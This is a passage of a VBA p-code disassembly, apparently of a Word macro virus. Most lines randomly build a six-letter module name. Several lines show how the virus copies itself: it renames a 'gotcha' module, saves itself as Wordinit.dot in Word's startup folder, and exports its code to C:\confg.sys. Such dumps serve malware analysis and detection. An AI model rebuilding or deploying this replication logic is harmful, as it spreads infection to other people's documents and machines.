' 	LitStr 0x0001 "G"
' 	St D$ 
' 	EndIf 
' Line #334:
' 	Ld q 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St D$ 
' 	EndIf 
' Line #335:
' 	Ld q 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St D$ 
' 	EndIf 
' Line #336:
' 	Ld q 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St D$ 
' 	EndIf 
' Line #337:
' 	Ld q 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St D$ 
' 	EndIf 
' Line #338:
' 	Ld q 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St D$ 
' 	EndIf 
' Line #339:
' 	Ld q 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St D$ 
' 	EndIf 
' Line #340:
' 	Ld q 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St D$ 
' 	EndIf 
' Line #341:
' 	Ld q 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St D$ 
' 	EndIf 
' Line #342:
' 	Ld q 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St D$ 
' 	EndIf 
' Line #343:
' 	Ld q 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St D$ 
' 	EndIf 
' Line #344:
' 	Ld q 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St D$ 
' 	EndIf 
' Line #345:
' 	Ld q 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St D$ 
' 	EndIf 
' Line #346:
' 	Ld q 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St D$ 
' 	EndIf 
' Line #347:
' 	Ld q 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St D$ 
' 	EndIf 
' Line #348:
' 	Ld q 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St D$ 
' 	EndIf 
' Line #349:
' 	Ld q 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St D$ 
' 	EndIf 
' Line #350:
' 	Ld q 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St D$ 
' 	EndIf 
' Line #351:
' 	Ld q 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St D$ 
' 	EndIf 
' Line #352:
' 	Ld q 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St D$ 
' 	EndIf 
' Line #353:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St w 
' Line #354:
' 	Ld w 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St E$ 
' 	EndIf 
' Line #355:
' 	Ld w 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St E$ 
' 	EndIf 
' Line #356:
' 	Ld w 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St E$ 
' 	EndIf 
' Line #357:
' 	Ld w 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St E$ 
' 	EndIf 
' Line #358:
' 	Ld w 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St E$ 
' 	EndIf 
' Line #359:
' 	Ld w 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St E$ 
' 	EndIf 
' Line #360:
' 	Ld w 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St E$ 
' 	EndIf 
' Line #361:
' 	Ld w 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St E$ 
' 	EndIf 
' Line #362:
' 	Ld w 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St E$ 
' 	EndIf 
' Line #363:
' 	Ld w 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St E$ 
' 	EndIf 
' Line #364:
' 	Ld w 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St E$ 
' 	EndIf 
' Line #365:
' 	Ld w 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St E$ 
' 	EndIf 
' Line #366:
' 	Ld w 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St E$ 
' 	EndIf 
' Line #367:
' 	Ld w 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St E$ 
' 	EndIf 
' Line #368:
' 	Ld w 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St E$ 
' 	EndIf 
' Line #369:
' 	Ld w 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St E$ 
' 	EndIf 
' Line #370:
' 	Ld w 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St E$ 
' 	EndIf 
' Line #371:
' 	Ld w 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St E$ 
' 	EndIf 
' Line #372:
' 	Ld w 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St E$ 
' 	EndIf 
' Line #373:
' 	Ld w 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St E$ 
' 	EndIf 
' Line #374:
' 	Ld w 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St E$ 
' 	EndIf 
' Line #375:
' 	Ld w 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St E$ 
' 	EndIf 
' Line #376:
' 	Ld w 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St E$ 
' 	EndIf 
' Line #377:
' 	Ld w 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St E$ 
' 	EndIf 
' Line #378:
' 	Ld w 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St E$ 
' 	EndIf 
' Line #379:
' 	Ld w 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St E$ 
' 	EndIf 
' Line #380:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St y 
' Line #381:
' 	Ld y 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St False$ 
' 	EndIf 
' Line #382:
' 	Ld y 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St False$ 
' 	EndIf 
' Line #383:
' 	Ld y 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St False$ 
' 	EndIf 
' Line #384:
' 	Ld y 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St False$ 
' 	EndIf 
' Line #385:
' 	Ld y 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St False$ 
' 	EndIf 
' Line #386:
' 	Ld y 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St False$ 
' 	EndIf 
' Line #387:
' 	Ld y 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St False$ 
' 	EndIf 
' Line #388:
' 	Ld y 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St False$ 
' 	EndIf 
' Line #389:
' 	Ld y 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St False$ 
' 	EndIf 
' Line #390:
' 	Ld y 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St False$ 
' 	EndIf 
' Line #391:
' 	Ld y 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St False$ 
' 	EndIf 
' Line #392:
' 	Ld y 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St False$ 
' 	EndIf 
' Line #393:
' 	Ld y 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St False$ 
' 	EndIf 
' Line #394:
' 	Ld y 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St False$ 
' 	EndIf 
' Line #395:
' 	Ld y 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St False$ 
' 	EndIf 
' Line #396:
' 	Ld y 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St False$ 
' 	EndIf 
' Line #397:
' 	Ld y 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St False$ 
' 	EndIf 
' Line #398:
' 	Ld y 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St False$ 
' 	EndIf 
' Line #399:
' 	Ld y 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St False$ 
' 	EndIf 
' Line #400:
' 	Ld y 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St False$ 
' 	EndIf 
' Line #401:
' 	Ld y 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St False$ 
' 	EndIf 
' Line #402:
' 	Ld y 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St False$ 
' 	EndIf 
' Line #403:
' 	Ld y 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St False$ 
' 	EndIf 
' Line #404:
' 	Ld y 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St False$ 
' 	EndIf 
' Line #405:
' 	Ld y 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St False$ 
' 	EndIf 
' Line #406:
' 	Ld y 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St False$ 
' 	EndIf 
' Line #407:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St t 
' Line #408:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St G$ 
' 	EndIf 
' Line #409:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St G$ 
' 	EndIf 
' Line #410:
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St G$ 
' 	EndIf 
' Line #411:
' 	Ld t 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St G$ 
' 	EndIf 
' Line #412:
' 	Ld t 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St G$ 
' 	EndIf 
' Line #413:
' 	Ld t 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St G$ 
' 	EndIf 
' Line #414:
' 	Ld t 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St G$ 
' 	EndIf 
' Line #415:
' 	Ld t 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St G$ 
' 	EndIf 
' Line #416:
' 	Ld t 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St G$ 
' 	EndIf 
' Line #417:
' 	Ld t 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St G$ 
' 	EndIf 
' Line #418:
' 	Ld t 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St G$ 
' 	EndIf 
' Line #419:
' 	Ld t 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St G$ 
' 	EndIf 
' Line #420:
' 	Ld t 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St G$ 
' 	EndIf 
' Line #421:
' 	Ld t 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St G$ 
' 	EndIf 
' Line #422:
' 	Ld t 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St G$ 
' 	EndIf 
' Line #423:
' 	Ld t 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St G$ 
' 	EndIf 
' Line #424:
' 	Ld t 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St G$ 
' 	EndIf 
' Line #425:
' 	Ld t 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St G$ 
' 	EndIf 
' Line #426:
' 	Ld t 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St G$ 
' 	EndIf 
' Line #427:
' 	Ld t 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St G$ 
' 	EndIf 
' Line #428:
' 	Ld t 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St G$ 
' 	EndIf 
' Line #429:
' 	Ld t 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St G$ 
' 	EndIf 
' Line #430:
' 	Ld t 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St G$ 
' 	EndIf 
' Line #431:
' 	Ld t 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St G$ 
' 	EndIf 
' Line #432:
' 	Ld t 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St G$ 
' 	EndIf 
' Line #433:
' 	Ld t 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St G$ 
' 	EndIf 
' Line #434:
' 	Ld A$ 
' 	Ld C$ 
' 	Add 
' 	Ld D$ 
' 	Add 
' 	Ld E$ 
' 	Add 
' 	Ld False$ 
' 	Add 
' 	Ld G$ 
' 	Add 
' 	St B$ 
' Line #435:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\Wordinit.dot"
' 	Add 
' 	ParamNamed Source 
' 	LitStr 0x0006 "gotcha"
' 	ParamNamed New 
' 	Ld B$ 
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #436:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\Wordinit.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #437:
' 	Ld Exitt_Word 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld DocName 
' 	ParamNamed FileName 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' 	EndIf 
' Line #438:
' 	Ld wdSaveChanges 
' 	ParamNamed SaveChanges 
' 	LitDI2 0x0001 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #439:
' 	EndIfBlock 
' Line #440:
' 	Ld Init 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Scan_For_Doc 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #441:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #442:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #443:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #444:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #445:
' 	LitStr 0x0000 ""
' 	ParamNamed template 
' 	LitVarSpecial (False)
' 	ParamNamed NewTemplate 
' 	Ld Documents 
' 	ArgsMemCall Add 0x0002 
' Line #446:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\Wordinit.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #447:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #448:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #449:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St A$ 
' 	EndIf 
' Line #450:
' 	Ld x 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St A$ 
' 	EndIf 
' Line #451:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St A$ 
' 	EndIf 
' Line #452:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St A$ 
' 	EndIf 
' Line #453:
' 	Ld x 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St A$ 
' 	EndIf 
' Line #454:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St A$ 
' 	EndIf 
' Line #455:
' 	Ld x 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St A$ 
' 	EndIf 
' Line #456:
' 	Ld x 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St A$ 
' 	EndIf 
' Line #457:
' 	Ld x 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St A$ 
' 	EndIf 
' Line #458:
' 	Ld x 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St A$ 
' 	EndIf 
' Line #459:
' 	Ld x 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St A$ 
' 	EndIf 
' Line #460:
' 	Ld x 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St A$ 
' 	EndIf 
' Line #461:
' 	Ld x 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St A$ 
' 	EndIf 
' Line #462:
' 	Ld x 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St A$ 
' 	EndIf 
' Line #463:
' 	Ld x 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St A$ 
' 	EndIf 
' Line #464:
' 	Ld x 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St A$ 
' 	EndIf 
' Line #465:
' 	Ld x 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St A$ 
' 	EndIf 
' Line #466:
' 	Ld x 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St A$ 
' 	EndIf 
' Line #467:
' 	Ld x 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St A$ 
' 	EndIf 
' Line #468:
' 	Ld x 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St A$ 
' 	EndIf 
' Line #469:
' 	Ld x 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St A$ 
' 	EndIf 
' Line #470:
' 	Ld x 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St A$ 
' 	EndIf 
' Line #471:
' 	Ld x 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St A$ 
' 	EndIf 
' Line #472:
' 	Ld x 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St A$ 
' 	EndIf 
' Line #473:
' 	Ld x 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St A$ 
' 	EndIf 
' Line #474:
' 	Ld x 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St A$ 
' 	EndIf 
' Line #475:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St s 
' Line #476:
' 	Ld s 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St C$ 
' 	EndIf 
' Line #477:
' 	Ld s 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St C$ 
' 	EndIf 
' Line #478:
' 	Ld s 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St C$ 
' 	EndIf 
' Line #479:
' 	Ld s 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St C$ 
' 	EndIf 
' Line #480:
' 	Ld s 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St C$ 
' 	EndIf 
' Line #481:
' 	Ld s 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St C$ 
' 	EndIf 
' Line #482:
' 	Ld s 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St C$ 
' 	EndIf 
' Line #483:
' 	Ld s 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St C$ 
' 	EndIf 
' Line #484:
' 	Ld s 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St C$ 
' 	EndIf 
' Line #485:
' 	Ld s 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St C$ 
' 	EndIf 
' Line #486:
' 	Ld s 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St C$ 
' 	EndIf 
' Line #487:
' 	Ld s 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St C$ 
' 	EndIf 
' Line #488:
' 	Ld s 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St C$ 
' 	EndIf 
' Line #489:
' 	Ld s 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St C$ 
' 	EndIf 
' Line #490:
' 	Ld s 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St C$ 
' 	EndIf 
' Line #491:
' 	Ld s 
' 	LitDI2 0x0010 
